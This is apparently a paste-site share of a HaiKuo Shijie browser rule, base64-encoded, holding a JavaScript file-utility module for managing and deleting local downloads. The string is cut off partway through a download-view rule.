cW1L6X6E,邀您一起看：本地资源管理|设置,xiaomianao666,JavaScript,Wednesday 14th of May 2025 12:16:10 PM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥本地资源管理|设置@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxhc3RfY2hhcHRlcl9ydWxlXCI6XCJcIixcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbe1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIiNmLkZpbGXlt6XlhbdcIixcInBhdGhcIjpcIkZpbGUuanNcIixcInJ1bGVcIjpcImNvbnN0IEZpbGUgPSBqYXZhLmlvLkZpbGU7XFxuY29uc3Qge1xcbiAgICBGaWxlcyxcXG4gICAgUGF0aHMsXFxuICAgIFN0YW5kYXJkQ29weU9wdGlvbixcXG4gICAgU3RhbmRhcmRPcGVuT3B0aW9uXFxufSA9IGphdmEubmlvLmZpbGU7XFxuY29uc3QgamF2YVN0cmluZyA9IGphdmEubGFuZy5TdHJpbmc7XFxubGV0IGphdmFTY29wZSA9IG5ldyBKYXZhSW1wb3J0ZXIoamF2YS5pbywgamF2YS5sYW5nLCBqYXZhLmxhbmcucmVmbGVjdCwgamF2YS51dGlsLlZlY3Rvcik7XFxuXFxuZnVuY3Rpb24gZGVsZXRlRmlsZXMoZmlsZU5hbWUpIHtcXG4gICAgbGV0IGZpbGUgPSBuZXcgRmlsZShmaWxlTmFtZSk7XFxuICAgIGlmICghZmlsZS5leGlzdHMoKSkge1xcbiAgICAgICAgLy9sb2coXFxcIuWIoOmZpOaWh+S7tuWksei0pe+8mlxcXCIgKyBmaWxlTmFtZSArIFxcXCLmlofku7bkuI3lrZjlnKhcXFwiKTtcXG4gICAgICAgIHJldHVybiBmYWxzZTtcXG4gICAgfSBlbHNlIHtcXG4gICAgICAgIGlmIChmaWxlLmlzRmlsZSgpKSB7XFxuICAgICAgICAgICAgcmV0dXJuIGRlbGV0ZUZpbGUoZmlsZU5hbWUpO1xcbiAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICByZXR1cm4gZGVsZXRlRGlyZWN0b3J5KGZpbGVOYW1lKTtcXG4gICAgICAgIH1cXG5cXG4gICAgfVxcblxcbn1cXG4vKipcXG4gKiDliKDpmaTljZXkuKrmlofku7ZcXG4gKiBcXG4gKiBAcGFyYW0gZmlsZU5hbWVcXG4gKiAgICAgICAgICAgIOiiq+WIoOmZpOaWh+S7tueahOaWh+S7tuWQjVxcbiAqIEByZXR1cm4g5Y2V5Liq5paH5Lu25Yig6Zmk5oiQ5Yqf6L+U5ZuedHJ1ZSzlkKbliJnov5Tlm55mYWxzZVxcbiAqL1xcbmZ1bmN0aW9uIGRlbGV0ZUZpbGUoZmlsZU5hbWUpIHtcXG4gICAgbGV0IGZpbGUgPSBuZXcgRmlsZShmaWxlTmFtZSk7XFxuICAgIGlmIChmaWxlLmlzRmlsZSgpICYmIGZpbGUuZXhpc3RzKCkpIHtcXG4gICAgICAgIGZpbGUuZGVsZXRlKCk7XFxuICAgICAgICAvL2xvZyhcXFwi5Yig6Zmk5Y2V5Liq5paH5Lu2XFxcIiArIGZpbGVOYW1lICsgXFxcIuaIkOWKn++8gVxcXCIpO1xcbiAgICAgICAgcmV0dXJuIHRydWU7XFxuICAgIH0gZWxzZSB7XFxuICAgICAgICAvL2xvZyhcXFwi5Yig6Zmk5Y2V5Liq5paH5Lu2XFxcIiArIGZpbGVOYW1lICsgXFxcIuWksei0pe+8gVxcXCIpO1xcbiAgICAgICAgcmV0dXJuIGZhbHNlO1xcbiAgICB9XFxuXFxufVxcbi8qKlxcbiAqIOWIoOmZpOebruW9le+8iOaWh+S7tuWkue+8ieS7peWPiuebruW9leS4i+eahOaWh+S7tlxcbiAqIFxcbiAqIEBwYXJhbSBkaXJcXG4gKiAgICAgICAgICAgIOiiq+WIoOmZpOebruW9leeahOaWh+S7tui3r+W+hFxcbiAqIEByZXR1cm4g55uu5b2V5Yig6Zmk5oiQ5Yqf6L+U5ZuedHJ1ZSzlkKbliJnov5Tlm55mYWxzZVxcbiAqL1xcbmZ1bmN0aW9uIGRlbGV0ZURpcmVjdG9yeShkaXIpIHtcXG4gICAgLy8g5aaC5p6cZGly5LiN5Lul5paH5Lu25YiG6ZqU56ym57uT5bC+77yM6Ieq5Yqo5re75Yqg5paH5Lu25YiG6ZqU56ymXFxuICAgIGlmICghZGlyLmVuZHNXaXRoKEZpbGUuc2VwYXJhdG9yKSkge1xcbiAgICAgICAgZGlyID0gZGlyICsgRmlsZS5zZXBhcmF0b3I7XFxuICAgIH1cXG4gICAgbGV0IGRpckZpbGUgPSBuZXcgRmlsZShkaXIpO1xcbiAgICAvLyDlpoLmnpxkaXLlr7nlupTnmoTmlofku7bkuI3lrZjlnKjvvIzmiJbogIXkuI3mmK/kuIDkuKrnm67lvZXvvIzliJnpgIDlh7pcXG4gICAgaWYgKCFkaXJGaWxlLmV4aXN0cygpIHx8ICFkaXJGaWxlLmlzRGlyZWN0b3J5KCkpIHtcXG4gICAgICAgIC8vbG9nKFxcXCLliKDpmaTnm67lvZXlpLHotKVcXFwiICsgZGlyICsgXFxcIuebruW9leS4jeWtmOWcqO+8gVxcXCIpO1xcbiAgICAgICAgcmV0dXJuIGZhbHNlO1xcbiAgICB9XFxuICAgIGxldCBmbGFnID0gdHJ1ZTtcXG4gICAgLy8g5Yig6Zmk5paH5Lu25aS55LiL55qE5omA5pyJ5paH5Lu2KOWMheaLrOWtkOebruW9lSlcXG4gICAgbGV0IGZpbGVzID0gZGlyRmlsZS5saXN0RmlsZXMoKTtcXG4gICAgZm9yIChsZXQgaSA9IDA7IGkgPCBmaWxlcy5sZW5ndGg7IGkrKykge1xcbiAgICAgICAgLy8g5Yig6Zmk5a2Q5paH5Lu2XFxuICAgICAgICBpZiAoZmlsZXNbaV0uaXNGaWxlKCkpIHtcXG4gICAgICAgICAgICBmbGFnID0gZGVsZXRlRmlsZShmaWxlc1tpXS5nZXRBYnNvbHV0ZVBhdGgoKSk7XFxuICAgICAgICAgICAgaWYgKCFmbGFnKSB7XFxuICAgICAgICAgICAgICAgIGJyZWFrO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH0gZWxzZSB7IC8vIOWIoOmZpOWtkOebruW9lVxcbiAgICAgICAgICAgIGZsYWcgPSBkZWxldGVEaXJlY3RvcnkoZmlsZXNbaV0uZ2V0QWJzb2x1dGVQYXRoKCkpO1xcbiAgICAgICAgICAgIGlmICghZmxhZykge1xcbiAgICAgICAgICAgICAgICBicmVhaztcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9XFxuICAgIH1cXG4gICAgaWYgKCFmbGFnKSB7XFxuICAgICAgICAvL2xvZyhcXFwi5Yig6Zmk55uu5b2V5aSx6LSlXFxcIik7XFxuICAgICAgICByZXR1cm4gZmFsc2U7XFxuICAgIH1cXG4gICAgLy8g5Yig6Zmk5b2T5YmN55uu5b2VXFxuICAgIGlmIChkaXJGaWxlLmRlbGV0ZSgpKSB7XFxuICAgICAgICAvL2xvZyhcXFwi5Yig6Zmk55uu5b2VXFxcIiArIGRpciArIFxcXCLmiJDlip/vvIFcXFwiKTtcXG4gICAgICAgIHJldHVybiB0cnVlO1xcbiAgICB9IGVsc2Uge1xcbiAgICAgICAgLy9sb2coXFxcIuWIoOmZpOebruW9lVxcXCIgKyBkaXIgKyBcXFwi5aSx6LSl77yBXFxcIik7XFxuICAgICAgICByZXR1cm4gZmFsc2U7XFxuICAgIH1cXG59XFxuXFxuLy9jb3B55Y2V5Liq5paH5Lu2XFxuZnVuY3Rpb24gY29weUZpbGUoc291cmNlLCB0YXJnZXQsIGlzQ292ZXIpIHtcXG4gICAgbGV0IHNvdXJjZVBhdGggPSBQYXRocy5nZXQoc291cmNlKTtcXG4gICAgbGV0IHRhcmdldFBhdGggPSBQYXRocy5nZXQodGFyZ2V0KTtcXG4gICAgbGV0IGlzRXhpc3QgPSBGaWxlcy5leGlzdHModGFyZ2V0UGF0aCk7XFxuICAgIGlmIChGaWxlcy5pc0RpcmVjdG9yeShzb3VyY2VQYXRoKSB8fCAoaXNFeGlzdCAmJiAhaXNDb3ZlcikgfHwgKGlzRXhpc3QgJiYgRmlsZXMuaXNEaXJlY3RvcnkodGFyZ2V0UGF0aCkpKSB7XFxuICAgICAgICByZXR1cm4gZmFsc2U7XFxuICAgIH1cXG4gICAgdHJ5IHtcXG4gICAgICAgIGlmICghaXNFeGlzdCkge1xcbiAgICAgICAgICAgIEZpbGVzLmNyZWF0ZURpcmVjdG9yaWVzKHRhcmdldFBhdGguZ2V0UGFyZW50KCkpO1xcbiAgICAgICAgfVxcbiAgICAgICAgaWYgKGlzQ292ZXIgPT09IHRydWUpIHtcXG4gICAgICAgICAgICBGaWxlcy5jb3B5KHNvdXJjZVBhdGgsIHRhcmdldFBhdGgsIFN0YW5kYXJkQ29weU9wdGlvbi5SRVBMQUNFX0VYSVNUSU5HLCBTdGFuZGFyZENvcHlPcHRpb24uQ09QWV9BVFRSSUJVVEVTKTtcXG4gICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgRmlsZXMuY29weShzb3VyY2VQYXRoLCB0YXJnZXRQYXRoLCBTdGFuZGFyZENvcHlPcHRpb24uQ09QWV9BVFRSSUJVVEVTKTtcXG4gICAgICAgIH1cXG4gICAgfSBjYXRjaCAoZSkge1xcbiAgICAgICAgcmV0dXJuIGZhbHNlO1xcbiAgICB9XFxufVxcblxcbmZ1bmN0aW9uIGdldEZpbGVUaW1lKHBhdGgpIHtcXG4gICAgbGV0IGZpbGUgPSBuZXcgRmlsZShwYXRoKTtcXG4gICAgbGV0IGxhc3RNb2RpZmllZCA9IGZpbGUubGFzdE1vZGlmaWVkKCk7XFxuICAgIGxldCBkYXRlID0gbmV3IERhdGUobGFzdE1vZGlmaWVkKTtcXG4gICAgcmV0dXJuIGRhdGUuZ2V0VGltZSgpO1xcbn1cXG5cXG5mdW5jdGlvbiBnZXROYW1lKHBhdGgpIHtcXG4gICAgcmV0dXJuIG5ldyBGaWxlKHBhdGgpLmdldE5hbWUoKSArIFxcXCJcXFwiO1xcbn1cXG5cXG5mdW5jdGlvbiBnZXRGaWxlUGF0aChwYXRoLCB0eXBlLCBleHBhbmQpIHtcXG4gICAgdHlwZSA9IHR5cGUgfHwgXFxcImZpbGVcXFwiO1xcbiAgICBpZiAoIVtcXFwiZmlsZVxcXCIsIFxcXCJkaXJcXFwiXS5pbmNsdWRlcyh0eXBlKSkgdGhyb3cgbmV3IEVycm9yKFxcXCLnsbvlnovplJnor69cXFwiKTtcXG4gICAgbGV0IGZpbGVUeXBlID0gdHlwZSA9PT0gXFxcImZpbGVcXFwiID8gXFxcImlzRmlsZVxcXCIgOiBcXFwiaXNEaXJlY3RvcnlcXFwiO1xcbiAgICBsZXQgZmlsZSA9IG5ldyBGaWxlKHBhdGgpO1xcbiAgICBsZXQgYXJyYXkgPSBmaWxlLmxpc3RGaWxlcygpIHx8IFtdO1xcbiAgICBsZXQgcGF0aExpc3QgPSBbXTtcXG4gICAgZm9yIChsZXQgaSA9IDA7IGkgPCBhcnJheS5sZW5ndGg7IGkrKykge1xcbiAgICAgICAgaWYgKGFycmF5W2ldW2ZpbGVUeXBlXSgpKSB7XFxuICAgICAgICAgICAgcGF0aExpc3QucHVzaCh7XFxuICAgICAgICAgICAgICAgIG5hbWU6IGFycmF5W2ldLmdldE5hbWUoKSArIFxcXCJcXFwiLFxcbiAgICAgICAgICAgICAgICBwYXRoOiBhcnJheVtpXS5nZXRQYXRoKCkgKyBcXFwiXFxcIixcXG4gICAgICAgICAgICAgICAgbGFzdE1vZGlmaWVkOiBOdW1iZXIoYXJyYXlbaV0ubGFzdE1vZGlmaWVkKCkpLFxcbiAgICAgICAgICAgIH0pO1xcbiAgICAgICAgfVxcbiAgICB9XFxuICAgIGlmIChleHBhbmQpIHtcXG4gICAgICAgIHBhdGhMaXN0ID0gcGF0aExpc3QuZmlsdGVyKGl0ID0+IGl0Lm5hbWUuZW5kc1dpdGgoZXhwYW5kKSk7XFxuICAgIH1cXG4gICAgcmV0dXJuIHBhdGhMaXN0O1xcbn1cXG5cXG5mdW5jdGlvbiBnZXRGaWxlcyhwYXRoLCB0eXBlLCBleHBhbmQpIHtcXG4gICAgbGV0IHR5cGVzID0ge1xcbiAgICAgICAgXFxcImZpbGVcXFwiOiBcXFwiaXNGaWxlXFxcIixcXG4gICAgICAgIFxcXCJkaXJcXFwiOiBcXFwiaXNEaXJlY3RvcnlcXFwiXFxuICAgIH07XFxuICAgIGxldCBmaWxlVHlwZSA9IHR5cGVzW3R5cGVdO1xcbiAgICBsZXQgZmlsZSA9IG5ldyBGaWxlKHBhdGgpO1xcbiAgICBsZXQgYXJyYXkgPSBmaWxlLmxpc3RGaWxlcygpIHx8IFtdO1xcbiAgICBsZXQgZmlsZUxpc3QgPSBbXTtcXG4gICAgZm9yIChsZXQgaSA9IDA7IGkgPCBhcnJheS5sZW5ndGg7IGkrKykge1xcbiAgICAgICAgbGV0IGZpbGUgPSBhcnJheVtpXTtcXG4gICAgICAgIGlmICgoIWZpbGVUeXBlIHx8IGZpbGVbZmlsZVR5cGVdKCkpICYmICghZXhwYW5kIHx8IGZpbGUuZ2V0TmFtZSgpLmVuZHNXaXRoKGV4cGFuZCkpKSB7XFxuICAgICAgICAgICAgZmlsZUxpc3QucHVzaChmaWxlKTtcXG4gICAgICAgIH1cXG4gICAgfVxcbiAgICByZXR1cm4gZmlsZUxpc3Q7XFxufVxcblxcbmZ1bmN0aW9uIHJlbmFtZUZpbGUoZnJvbVBhdGgsIG5hbWUpIHtcXG4gICAgbGV0IGZyb21GaWxlID0gbmV3IEZpbGUoZnJvbVBhdGgpO1xcbiAgICBsZXQgdG9GaWxlID0gbmV3IEZpbGUoZnJvbUZpbGUuZ2V0UGFyZW50KCkgKyBcXFwiL1xcXCIgKyBuYW1lKTtcXG4gICAgdHJ5IHtcXG4gICAgICAgIGlmICghZnJvbUZpbGUuZXhpc3RzKCkpIHtcXG4gICAgICAgICAgICByZXR1cm4gZmFsc2U7XFxuICAgICAgICB9XFxuICAgICAgICBpZiAodG9GaWxlLmV4aXN0cygpKSB7XFxuICAgICAgICAgICAgaWYgKCF0b0ZpbGUuZGVsZXRlKCkpIHtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH1cXG4gICAgICAgIEZpbGVzLm1vdmUoZnJvbUZpbGUudG9QYXRoKCksIHRvRmlsZS50b1BhdGgoKSwgU3RhbmRhcmRDb3B5T3B0aW9uLlJFUExBQ0VfRVhJU1RJTkcpO1xcbiAgICAgICAgcmV0dXJuIHRydWU7XFxuICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICAgIGxvZyhlLnRvU3RyaW5nKCkpO1xcbiAgICAgICAgcmV0dXJuIGZhbHNlO1xcbiAgICB9XFxufVxcblxcbmZ1bmN0aW9uIG1vdmVGaWxlcyhmcm9tUGF0aCwgdG9QYXRoKSB7XFxuICAgIGxldCBmcm9tRmlsZSA9IG5ldyBGaWxlKGZyb21QYXRoKTtcXG4gICAgbGV0IHRvRmlsZSA9IG5ldyBGaWxlKHRvUGF0aCk7XFxuICAgIHRyeSB7XFxuICAgICAgICBpZiAoIWZyb21GaWxlLmV4aXN0cygpKSB7XFxuICAgICAgICAgICAgcmV0dXJuIGZhbHNlO1xcbiAgICAgICAgfVxcbiAgICAgICAgaWYgKHRvRmlsZS5leGlzdHMoKSkge1xcbiAgICAgICAgICAgIGlmICghZGVsZXRlRmlsZXModG9QYXRoKSkge1xcbiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfVxcbiAgICAgICAgRmlsZXMubW92ZShmcm9tRmlsZS50b1BhdGgoKSwgdG9GaWxlLnRvUGF0aCgpLCBTdGFuZGFyZENvcHlPcHRpb24uUkVQTEFDRV9FWElTVElORyk7XFxuICAgICAgICByZXR1cm4gdHJ1ZTtcXG4gICAgfSBjYXRjaCAoZSkge1xcbiAgICAgICAgbG9nKGUudG9TdHJpbmcoKSk7XFxuICAgICAgICByZXR1cm4gZmFsc2U7XFxuICAgIH1cXG59XFxuXFxuZnVuY3Rpb24gZmlsZVdyaXRlKHBhdGgsIGNvbnRlbnQpIHtcXG4gICAgd3JpdGVGaWxlKFxcXCJmaWxlOi8vXFxcIiArIHBhdGgsIGNvbnRlbnQpXFxufVxcblxcbmZ1bmN0aW9uIGZpbGVXcml0ZUFwcGVuZChwYXRoLCBjb250ZW50KSB7XFxuICAgIGxldCBmaWxlID0gbmV3IEZpbGUocGF0aCk7XFxuICAgIGxldCBwYXRocyA9IGZpbGUudG9QYXRoKCk7XFxuICAgIGlmIChmaWxlLmV4aXN0cygpKSB7XFxuICAgICAgICBGaWxlcy53cml0ZShwYXRocywgbmV3IGphdmFTdHJpbmcoY29udGVudCkuZ2V0Qnl0ZXMoKSwgU3RhbmRhcmRPcGVuT3B0aW9uLkFQUEVORCk7XFxuICAgIH0gZWxzZSB7XFxuICAgICAgICB3cml0ZUZpbGUoXFxcImZpbGU6Ly9cXFwiICsgcGF0aCwgY29udGVudCk7XFxuICAgIH1cXG59XFxuXFxuZnVuY3Rpb24gZ2V0VG90YWxTaXplT2ZGaWxlc0luRGlyKGZpbGUpIHtcXG4gICAgaWYgKGZpbGUuaXNGaWxlKCkpIHtcXG4gICAgICAgIHJldHVybiBmaWxlLmxlbmd0aCgpO1xcbiAgICB9XFxuICAgIGxldCBjaGlsZHJlbiA9IGZpbGUubGlzdEZpbGVzKCk7XFxuICAgIGxldCB0b3RhbCA9IDA7XFxuICAgIGlmIChjaGlsZHJlbiAhPSBudWxsKSB7XFxuICAgICAgICBmb3IgKGxldCBjaGlsZCBvZiBjaGlsZHJlbikge1xcbiAgICAgICAgICAgIHRvdGFsICs9IGdldFRvdGFsU2l6ZU9mRmlsZXNJbkRpcihjaGlsZCk7XFxuICAgICAgICB9XFxuICAgIH1cXG4gICAgcmV0dXJuIHRvdGFsO1xcbn1cXG5cXG5mdW5jdGlvbiBnZXRGaWxlU2l6ZShmaWxlUGF0aCkge1xcbiAgICAvL0J5dGVcXG4gICAgbGV0IHNpemUgPSBnZXRUb3RhbFNpemVPZkZpbGVzSW5EaXIobmV3IEZpbGUoZmlsZVBhdGgpKTtcXG4gICAgaWYgKHNpemUgPCAwKSB7XFxuICAgICAgICByZXR1cm4gbnVsbDtcXG4gICAgfVxcbiAgICBsZXQgdW5pdEZvcm0gPSBbXFxcIkJ5dGVcXFwiLCBcXFwiS0JcXFwiLCBcXFwiTUJcXFwiLCBcXFwiR0JcXFwiLCBcXFwiVEJcXFwiXTtcXG4gICAgZm9yIChsZXQgaSA9IDAsIGxlbiA9IHVuaXRGb3JtLmxlbmd0aDsgaSA8IGxlbjsgaSsrKSB7XFxuICAgICAgICBpZiAoc2l6ZSA+IDEwMjQpIHtcXG4gICAgICAgICAgICBzaXplIC89IDEwMjQ7XFxuICAgICAgICAgICAgY29udGludWU7XFxuICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgIHJldHVybiBzaXplLnRvRml4ZWQoMikucmVwbGFjZSgvKFxcXFwuMDApJC8sIFxcXCJcXFwiKSArIHVuaXRGb3JtW2ldO1xcbiAgICAgICAgfVxcbiAgICB9XFxuICAgIHJldHVybiBcXFwiRVJST1I65pWw5YC86L+H5aSnXFxcIjtcXG59XFxuLy/lrozmlbTlkIjlubZcXG4vKlxcbmZ1bmN0aW9uIGZpbGVDb21iaW5lKGZpbGVzSW5wdXQsIGZpbGVPdXQsIGV4dGVuc2lvbiwgaW50ZXJjZXB0KSB7XFxuICAgIHdpdGgoamF2YVNjb3BlKSB7XFxuICAgICAgICBjb25zdCBUTVBfQlVGRkVSX1NJWkUgPSAweDMwMDAwO1xcbiAgICAgICAgY29uc3QgQlVGRkVSX1NJWkUgPSAweDMwMDAwMDtcXG4gICAgICAgIC8v5ZCI5bm25Li05pe25paH5Lu2XFxuICAgICAgICBsZXQgaW5wdXRGaWxlID0gbmV3IEZpbGUoZmlsZXNJbnB1dCk7XFxuICAgICAgICBsZXQgdG1wRmlsZSA9IG5ldyBGaWxlKGZpbGVPdXQgKyBcXFwiLnRtcFxcXCIpO1xcbiAgICAgICAgbGV0IHRvcyA9IG5ldyBCdWZmZXJlZE91dHB1dFN0cmVhbShuZXcgRmlsZU91dHB1dFN0cmVhbSh0bXBGaWxlKSk7XFxuICAgICAgICBsZXQgaW5wdXRGaWxlcyA9IGlucHV0RmlsZS5saXN0RmlsZXMoKTtcXG4gICAgICAgIGxldCB0YnlzID0gQXJyYXkubmV3SW5zdGFuY2UoQnl0ZS5UWVBFLCBUTVBfQlVGRkVSX1NJWkUpO1xcbiAgICAgICAgZm9yIChsZXQgZmlsZSBvZiBpbnB1dEZpbGVzKSB7XFxuICAgICAgICAgICAgaWYgKGZpbGUuZ2V0TmFtZSgpLmVuZHNXaXRoKGV4dGVuc2lvbikpIHtcXG4gICAgICAgICAgICAgICAgbGV0IGlzID0gbmV3IEZpbGVJbnB1dFN0cmVhbShmaWxlKTtcXG4gICAgICAgICAgICAgICAgbGV0IGxlbiA9IDA7XFxuICAgICAgICAgICAgICAgIHdoaWxlICgobGVuID0gaXMucmVhZCh0YnlzKSkgIT0gLTEpIHtcXG4gICAgICAgICAgICAgICAgICAgIHRvcy53cml0ZSh0YnlzLCAwLCBsZW4pO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIGlzLmNsb3NlKCk7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfVxcbiAgICAgICAgdG9zLmNsb3NlKCk7XFxuICAgICAgICAvL+inhOWImeabv+aNouinhOWImTtcXG4gICAgICAgIGxldCBvdXRGaWxlID0gbmV3IEZpbGUoZmlsZU91dCk7XFxuICAgICAgICBpZiAodHlwZW9mIGludGVyY2VwdCA9PT0gXFxcImZ1bmN0aW9uXFxcIikge1xcbiAgICAgICAgICAgIGxldCB0aXMgPSBuZXcgRmlsZUlucHV0U3RyZWFtKHRtcEZpbGUpO1xcbiAgICAgICAgICAgIGxldCBvcyA9IG5ldyBCdWZmZXJlZE91dHB1dFN0cmVhbShuZXcgRmlsZU91dHB1dFN0cmVhbShvdXRGaWxlKSk7XFxuICAgICAgICAgICAgbGV0IGxlbiA9IDA7XFxuICAgICAgICAgICAgbGV0IGJ5cyA9IEFycmF5Lm5ld0luc3RhbmNlKEJ5dGUuVFlQRSwgQlVGRkVSX1NJWkUpO1xcbiAgICAgICAgICAgIHdoaWxlICgobGVuID0gdGlzLnJlYWQoYnlzKSkgIT0gLTEpIHtcXG4gICAgICAgICAgICAgICAgbGV0IG5ieXMgPSBpbnRlcmNlcHQobmV3IFN0cmluZyhieXMsMCxsZW4pKTtcXG4gICAgICAgICAgICAgICAgb3Mud3JpdGUobmJ5cywgMCwgbmJ5cy5sZW5ndGgpO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB0bXBGaWxlLmRlbGV0ZSgpO1xcbiAgICAgICAgICAgIHRpcy5jbG9zZSgpO1xcbiAgICAgICAgICAgIG9zLmNsb3NlKCk7XFxuICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgIGlmIChvdXRGaWxlLmV4aXN0cygpKSB7XFxuICAgICAgICAgICAgICAgIG91dEZpbGUuZGVsZXRlKCk7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIHRtcEZpbGUucmVuYW1lVG8ob3V0RmlsZSk7XFxuICAgICAgICB9XFxuICAgIH1cXG59Ki9cXG4vL+aui1xcbmZ1bmN0aW9uIGZpbGVSdWxlKGZpbGVzSW5wdXQsIGZpbGVPdXQsIGludGVyY2VwdCkge1xcbiAgICB3aXRoKGphdmFTY29wZSkge1xcbiAgICAgICAgY29uc3QgQlVGRkVSX1NJWkUgPSAweDMwMDAwMDtcXG4gICAgICAgIGxldCB0bXBGaWxlID0gbmV3IEZpbGUoZmlsZXNJbnB1dCk7XFxuICAgICAgICBpZiAoISh0bXBGaWxlLmV4aXN0cygpICYmIHRtcEZpbGUuaXNGaWxlKCkpKSB7XFxuICAgICAgICAgICAgcmV0dXJuIGZhbHNlO1xcbiAgICAgICAgfVxcbiAgICAgICAgbGV0IG91dEZpbGUgPSBuZXcgRmlsZShmaWxlT3V0KTtcXG5cXG4gICAgICAgIGxldCB0aXMgPSBuZXcgRmlsZUlucHV0U3RyZWFtKHRtcEZpbGUpO1xcbiAgICAgICAgbGV0IG9zID0gbmV3IEJ1ZmZlcmVkT3V0cHV0U3RyZWFtKG5ldyBGaWxlT3V0cHV0U3RyZWFtKG91dEZpbGUpKTtcXG4gICAgICAgIGxldCBsZW4gPSAwO1xcbiAgICAgICAgbGV0IGJ5cyA9IEFycmF5Lm5ld0luc3RhbmNlKEJ5dGUuVFlQRSwgQlVGRkVSX1NJWkUpO1xcbiAgICAgICAgd2hpbGUgKChsZW4gPSB0aXMucmVhZChieXMpKSAhPSAtMSkge1xcbiAgICAgICAgICAgIGxldCBuYnlzID0gaW50ZXJjZXB0KG5ldyBTdHJpbmcoYnlzLCAwLCBsZW4pKTtcXG4gICAgICAgICAgICBvcy53cml0ZShuYnlzLCAwLCBuYnlzLmxlbmd0aCk7XFxuICAgICAgICB9XFxuICAgICAgICB0bXBGaWxlLmRlbGV0ZSgpO1xcbiAgICAgICAgdGlzLmNsb3NlKCk7XFxuICAgICAgICBvcy5jbG9zZSgpO1xcbiAgICAgICAgcmV0dXJuIHRydWU7XFxuICAgIH1cXG59XFxuXFxuZnVuY3Rpb24gcmVhZEZpbGUocGF0aCkge1xcbiAgICB0cnkge1xcbiAgICAgICAgbGV0IHBhdGhzID0gUGF0aHMuZ2V0KHBhdGgpO1xcbiAgICAgICAgaWYgKCFGaWxlcy5leGlzdHMocGF0aHMpKSByZXR1cm4gXFxcIlxcXCI7XFxuICAgICAgICByZXR1cm4gU3RyaW5nKG5ldyBqYXZhU3RyaW5nKEZpbGVzLnJlYWRBbGxCeXRlcyhwYXRocykpKTtcXG4gICAgfSBjYXRjaCB7XFxuICAgICAgICByZXR1cm4gXFxcIlxcXCI7XFxuICAgIH1cXG59XFxuJC5leHBvcnRzID0ge1xcbiAgICBnZXRGaWxlVGltZTogKHBhdGgpID0+IGdldEZpbGVUaW1lKHBhdGgpLFxcbiAgICBnZXRGaWxlUGF0aDogKHBhdGgsIHR5cGUsIGV4cGFuZCkgPT4gZ2V0RmlsZVBhdGgocGF0aCwgdHlwZSwgZXhwYW5kKSxcXG4gICAgZGVsZXRlRmlsZXM6IChwYXRoKSA9PiBkZWxldGVGaWxlcyhwYXRoKSxcXG4gICAgcmVuYW1lRmlsZTogKHBhdGgsIG5hbWUpID0+IHJlbmFtZUZpbGUocGF0aCwgbmFtZSksXFxuICAgIG1vdmVGaWxlczogKGZyb21QYXRoLCB0b1BhdGgpID0+IG1vdmVGaWxlcyhmcm9tUGF0aCwgdG9QYXRoKSxcXG4gICAgZmlsZVdyaXRlOiAocGF0aCwgY29udGVudCkgPT4gZmlsZVdyaXRlKHBhdGgsIGNvbnRlbnQpLFxcbiAgICBmaWxlV3JpdGVBcHBlbmQ6IChwYXRoLCBjb250ZW50KSA9PiBmaWxlV3JpdGVBcHBlbmQocGF0aCwgY29udGVudCksXFxuICAgIGdldE5hbWU6IChwYXRoKSA9PiBnZXROYW1lKHBhdGgpLFxcbiAgICBnZXRGaWxlU2l6ZTogKGZpbGVQYXRoKSA9PiBnZXRGaWxlU2l6ZShmaWxlUGF0aCksXFxuICAgIGZpbGVSdWxlOiAoZmlsZXNJbnB1dCwgZmlsZU91dCwgaW50ZXJjZXB0KSA9PiBmaWxlUnVsZShmaWxlc0lucHV0LCBmaWxlT3V0LCBpbnRlcmNlcHQpLFxcbiAgICBjb3B5RmlsZTogKHNvdXJjZSwgdGFyZ2V0LCBpc0NvdmVyKSA9PiBjb3B5RmlsZShzb3VyY2UsIHRhcmdldCwgaXNDb3ZlciksXFxuICAgIHJlYWRGaWxlOiAocGF0aCkgPT4gcmVhZEZpbGUocGF0aCksXFxuICAgIGdldEZpbGVzOiAocGF0aCwgdHlwZSwgZXhwYW5kKSA9PiBnZXRGaWxlcyhwYXRoLCB0eXBlLCBleHBhbmQpLFxcbiAgICBnZXRUb3RhbFNpemVPZkZpbGVzSW5EaXI6KGZpbGUpPT5nZXRUb3RhbFNpemVPZkZpbGVzSW5EaXIoZmlsZSlcXG59XCJ9LHtcImNvbF90eXBlXCI6XCJ0ZXh0XzJcIixcIm5hbWVcIjpcIiN2LuS4i+i9veWIl+ihqC3mma7pgJrkuIvovb1cIixcInBhdGhcIjpcImRvd25sb2FkLnZpZXdcIixcInJ1bGVcIjpcImpzOlxcbmNvbnN0IHZpZXdDb25maWcgPSBPYmplY3QuYXNzaWduKHtcXG4gICAgY2hhcHRlckxpc3Q6IFtdLFxcbiAgICBpbmZvOiB7fSxcXG4gICAgZGVmYXVsdFZpZXc6IFxcXCIwXFxcIlxcbn0sIE1ZX1BBUkFNUyk7XFxudmlld0NvbmZpZy5pbmZvID0gT2JqZWN0LmFz